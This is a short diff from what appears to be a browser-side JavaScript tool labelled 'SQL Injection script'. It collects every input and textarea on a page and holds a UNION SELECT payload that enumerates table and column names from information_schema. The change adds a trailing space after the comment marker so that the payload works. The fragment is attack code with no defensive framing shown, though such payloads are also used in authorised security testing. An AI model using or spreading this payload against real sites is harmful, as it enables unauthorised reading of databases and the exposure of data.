@@ -27,7 +27,7 @@
   console.log("Running SQL Injection script...");
 
   const sqlPayloads = [
-    "' UNION SELECT table_name, column_name FROM information_schema.columns --"
+    "' UNION SELECT table_name, column_name FROM information_schema.columns -- "
   ];
 
   const formInputs = document.querySelectorAll('input, textarea');
